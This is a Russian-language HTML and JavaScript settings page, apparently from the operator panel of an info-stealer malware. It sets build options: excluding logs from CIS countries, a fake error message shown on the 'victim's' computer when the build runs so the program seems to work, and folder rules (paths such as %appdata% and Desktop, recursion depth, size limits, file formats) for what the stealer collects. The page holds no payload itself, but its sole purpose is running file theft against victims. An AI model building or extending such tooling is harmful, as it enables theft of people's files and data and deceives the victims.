<div class="row">
	<div class="col-12 grid-margin">
		<div class="card">
			<div class="card-body">
				<h4 class="card-title">Параметры запуска</h4>

				<div class="custom-control custom-checkbox">
					<input type="checkbox" id="block_sng" class="custom-control-input table-checkbox">
					<label class="custom-control-label table-checkbox-label" for="block_sng">Блокировать логи из СНГ</label>
				</div>

				<div class="text-right">
					<button class="btn btn-purple" id="save_params">Сохранить</button>
				</div>
			</div>
		</div>
	</div>
	<div class="col-12 grid-margin">
		<div class="card">
			<div class="card-body">
				<h4 class="card-title">Фэйк-ошибка <button class="btn btn-outline-secondary btn-circle btn-circle-sm" data-toggle="modal" data-target="#quest_modal_fake_error"><i class="fas fa-question"></i></button></h4>

				<div class="form-group">
					<label for="fm_title">Шапка уведомления</label>
					<input type="text" class="form-control" placeholder="Например: Ошибка Windows..." id="fe_header_value">
				</div>
				<div class="form-group">
					<label for="fm_title">Текст уведомления</label>
					<input type="text" class="form-control" placeholder="Например: Произошла фатальная ошибка..." id="fe_text_value">
				</div>
				<div class="form-group">
					<label for="fm_title">Тип уведомления</label>
					<select type="text" class="form-control custom-select" id="fe_type_value">
						<option value="1">Ошибка</option>
						<option value="2">Предупреждение</option>
						<option value="3">Вопрос</option>
						<option value="4">Информация</option>
					</select>
				</div>

				<div class="custom-control custom-checkbox">
					<input type="checkbox" name="use_error" id="use_error" class="custom-control-input table-checkbox">
					<label class="custom-control-label table-checkbox-label" for="use_error">Использовать ошибку</label>
				</div>

				<div class="text-right">
					<button class="btn btn-purple" id="save_error">Сохранить</button>
				</div>
			</div>
		</div>
	</div>
	<div class="col-12 grid-margin">
		<div class="card">
			<div class="card-body">
				<h4 class="card-title">Поиск файлов</h4>
				<p class="card-description">Задайти здесь папки, по которым стиллер пройдется во время работы и соберет интересные вам файлы. Используйте конструкции со знаком процента для указания директорий, прописанных в PATH (например, %appdata%, %localappdata%, %userprofile%, а также конструкции: %userprofile%/Desktop и пр.)</p>
	
				<button class="btn btn-purple mb-2" data-toggle="modal" data-target="#add_folder_modal">Добавить папку</button>
				<div class="table-responsive">
					<table class="table" id="table-folder">
						<thead>
							<tr>
								<th>Название</th>
								<th>Путь</th>
								<th>Рекурсия</th>
								<th>Дальность</th>
								<th>Размер</th>
								<th>Форматы</th>
								<th>Инструменты</th>
							</tr>
						</thead>
					</table>
				</div>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="quest_modal_fake_error" tabindex="-1" role="dialog">
	<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">Фэйк ошибка</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<p>Используется для усиления эффекта работоспособности программы. Заданные вами данные будут выведены на компьютере жертвы при запуске билда в виде сообщения.</p>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Ок</button>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="add_folder_modal" tabindex="-1" role="dialog">
	<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">Добавить папку</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<div class="form-group">
					<label for="name_folder">Название</label>
					<input type="text" id="name_folder" placeholder="Имя конфига" class="form-control">
				</div>
				<div class="form-group">
					<label for="path_folder">Путь</label>
					<input type="text" id="path_folder" placeholder="Путь до начальной папки" class="form-control">
				</div>
				<div class="form-group">
					<div class="custom-control custom-checkbox">
						<input type="checkbox" id="recursive_folder" class="custom-control-input table-checkbox">
						<label class="custom-control-label table-checkbox-label" for="recursive_folder">Использовать рекурсию</label>
					</div>
				</div>
				<div class="form-group">
					<label for="rcount_folder">Дальность рекурсии</label>
					<input type="number" id="rcount_folder" placeholder="Насколько далеко зайдет программа" class="form-control">
				</div>
				<div class="form-group">
					<label for="size_folder">Размер файла</label>
					<div class="input-group">
						<input type="text" id="size_folder" placeholder="Максимальный размер файла" class="form-control">
						<div class="input-group-append">
							<span class="input-group-text bg-dark">Мб</span>
						</div>
					</div>
				</div>
				<div class="form-group">
					<label for="formats_folder">Форматы файлов (".*" - все файлы)</label>
					<input type="text" id="formats_folder" class="form-control" placeholder="Вводите форматы файлов, разделяя точкой">
					<p class="text-muted" id="tags"></p>
				</div>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Закрыть</button>
				<button type="button" class="btn btn-purple" id="create_folder">Создать</button>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="change_folder_modal" tabindex="-1" role="dialog">
	<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">Изменить папку</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<div class="form-group">
					<label for="change_name_folder">Название</label>
					<input type="text" id="change_name_folder" placeholder="Имя конфига" class="form-control">
				</div>
				<div class="form-group">
					<label for="change_path_folder">Путь</label>
					<input type="text" id="change_path_folder" placeholder="Путь до начальной папки" class="form-control">
				</div>
				<div class="form-group">
					<div class="custom-control custom-checkbox">
						<input type="checkbox" id="change_recursive_folder" class="custom-control-input table-checkbox">
						<label class="custom-control-label table-checkbox-label" for="change_recursive_folder">Использовать рекурсию</label>
					</div>
				</div>
				<div class="form-group">
					<label for="change_rcount_folder">Дальность рекурсии</label>
					<input type="number" id="change_rcount_folder" placeholder="Насколько далеко зайдет программа" class="form-control">
				</div>
				<div class="form-group">
					<label for="change_size_folder">Размер файла</label>
					<div class="input-group">
						<input type="text" id="change_size_folder" placeholder="Максимальный размер файла" class="form-control">
						<div class="input-group-append">
							<span class="input-group-text bg-dark">Мб</span>
						</div>
					</div>
				</div>
				<div class="form-group">
					<label for="change_formats_folder">Форматы файлов (".*" - все файлы)</label>
					<input type="text" id="change_formats_folder" class="form-control" placeholder="Вводите форматы файлов, разделяя точкой">
					<p class="text-muted" id="change_tags"></p>
				</div>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Закрыть</button>
				<button type="button" class="btn btn-purple" id="change_folder">Сохранить</button>
			</div>
		</div>
	</div>
</div>

<script>
	var tags = [];
	var change_tags = [];

	var changed_id = 0;
	var table;

	$(document).ready(function() {
		data = sendData("/settings/info/fe");
		if(data) {
			if(data.length > 0) {
				data = data[0];

				$("#fe_header_value").val(data.header); 
				$("#fe_text_value").val(data.text);
				$("#fe_type_value").val(data.type);
				$("#use_error").prop('checked', data.use=='1'?true:false);
			}
			else {
				$("#use_error").prop('checked', false);
			}
		}

		data = sendData('/settings/info/params');
		if(data) {
			$("#block_sng").prop('checked', data["sng"]==1);
		}

		table = $("#table-folder").DataTable({
			autoWidth: false,
			processing: true,
	    	dom: 't',
	        ajax: {
	            "url": "/settings/info/folder_table",
	            "type": "POST",
	        },
	        columns: [
	            { data: "name" }, 
	            { data: "path" },
	            { 
	            	data: "recursive",
	            	render: function(data, type, row) {
	            		return data == "true" ? "<i class='fal fa-check'></i>" : "<i class='fal fa-times'></i>";
	            	},
	            },
	            { data: "rcount" },
	            { data: "size" },
	            { data: "formats" },
	            { 
	            	data: "id",
	            	render: function(data, type, row) {
	            		return "<div class='btn-group'><button class='btn btn-info' onclick='folder_info(" + data + ")'><i class='fas fa-info'></i></button><button class='btn btn-danger' onclick='folder_delete(" + data + ")'><i class='fas fa-trash-alt'></i></button></div>";
	            	},
	            },
	        ],
	        language: {
	            "emptyTable": "Нет данных",
	            "zeroRecords": "Ничего не найдено",
	            "loadingRecords": "Загрузка данных...",
	            "processing": "В процессе...",
	        },
	        deferRender: true,
		});
		$("#rcount_folder").prop('disabled', true);
		$("#change_rcount_folder").prop('disabled', true);
	});

	function folder_delete(id) {
		swal.fire({
			icon: "warning",
			title: "Вы уверены?",
			text: "Если вы продолжите, то выбранный вами конфиг будет удален",
			showCancelButton: true,
	        confirmButtonText: 'Да, удалить',
	        cancelButtonText: 'Назад',
			customClass: {
				popup: 'swal-popup-class',
				title: 'swal-title-class',
			},
	    }).then((result) => {
	        if (result.value) {
	            data = sendData("/settings/delete/folder", {"id": id});
	            if(data) {
					if(CheckData(data)) {
						table.ajax.reload();
					}
				}
	        }
	    });
	}

	function folder_info(id) {
		data = sendData('/settings/info/folder', {"id": id});
		if(data) {
			data = CheckData(data);
			if(data != false) {
				
				$("#change_name_folder").val(data["name"]);
				$("#change_path_folder").val(data["path"]);
				$("#change_recursive_folder").prop('checked', data["recursive"]=='true'?true:false);
				$("#change_rcount_folder").val(data["rcount"]);
				$("#change_size_folder").val(data["size"]);
				
				for(index in data["formats"])
					$("#change_formats_folder").val($("#change_formats_folder").val() + '.' + data["formats"][index]);

				update_change_tags();
				changed_id = id;

				
				$("#change_folder_modal").modal();
			}
		}
	}

	$("#change_folder").click(function() {
		request = {};

		request.name = $("#change_name_folder").val();
		request.path = $("#change_path_folder").val();
		request.recursive = $("#change_recursive_folder").prop('checked');
		request.rcount = $("#change_rcount_folder").val();
		request.size = $("#change_size_folder").val();
		request.formats = change_tags;

		response = sendData('/settings/edit/folder', {"id": changed_id, "data": request});
		if(response) {
			response = CheckData(response);
			if(response != false) {
				SuccessAlert("Настройки сохранены");
				table.ajax.reload();
				$("#change_folder_modal").modal('hide');
			}
		}
	});

	function update_change_tags() {
		tags_text = $("#change_tags").text();
		value = $("#change_formats_folder").val();

		if(value.length > 0) {
			value.split('.').forEach(function(item, i, value) {
				if(i != 0)
					change_tags[i - 1] = item;
			});
		}
		else {
			change_tags = [];
		}

		change_tags = change_tags.filter(element => element !== "");

		$("#change_tags").html('Форматы: ');
		for(index in change_tags) {
			$("#change_tags").html($("#change_tags").html() + '<span class="badge badge-secondary ml-2">' + change_tags[index] + "</div>");
		}
	}
	
	$("#change_formats_folder").bind('keyup', update_change_tags);
	
	$("#formats_folder").bind('keyup', function() {
		tags_text = $("#tags").text();
		value = $("#formats_folder").val();

		if(value.length > 0) {
			value.split('.').forEach(function(item, i, value) {
				if(i != 0)
					tags[i - 1] = item;
			});
		}
		else {
			tags = [];
		}

		tags = tags.filter(element => element !== "");

		$("#tags").html('Форматы: ');
		for(index in tags) {
			$("#tags").html($("#tags").html() + '<span class="badge badge-secondary ml-2">' + tags[index] + "</div>");
		}
	});

	$("#save_params").click(function() {
		sng = $("#block_sng").prop('checked');

		data = CheckData(sendData("/settings/save/params", {
			"sng": sng,
		}));

		if(data) {
			SuccessAlert("Настройки сохранены");
		}
	});

	$("#create_folder").click(function() {
		name = $("#name_folder").val();
		path = $("#path_folder").val();
		recursive = $("#recursive_folder").prop('checked');
		rcount = $("#rcount_folder").val();
		size = $("#size_folder").val();
		formats = tags;

		data = sendData("/settings/save/folder", 
		{
			"name": name,
			"path": path,
			"recursive": recursive,
			"rcount": rcount,
			"size": size,
			"formats": formats,
		});
		if(data) {
			data = CheckData(data);
			if(data != false) {
				SuccessAlert("Настройки сохранены");
				table.ajax.reload();
				$("#add_folder_modal").modal('hide');
			}
		}
	});
	$("#save_error").click(function() {
		data = sendData('/settings/save/fe', 
		{
			"header": $("#fe_header_value").val(), 
			"text": $("#fe_text_value").val(),
			"type": $("#fe_type_value").val(),
			"use": $("#use_error").prop('checked'),
		});
		if(data) {
			data = CheckData(data);
			if(data != false) {
				SuccessAlert('Настройки сохранены');
			}
		}
	});

	$("#recursive_folder").change(function() {
		if($(this).prop('checked'))
			$("#rcount_folder").removeAttr('disabled');
		else
			$("#rcount_folder").prop('disabled', true);
	});

	$("#change_recursive_folder").change(function() {
		if($(this).prop('checked'))
			$("#change_rcount_folder").removeAttr('disabled');
		else
			$("#change_rcount_folder").prop('disabled', true);
	});
</script>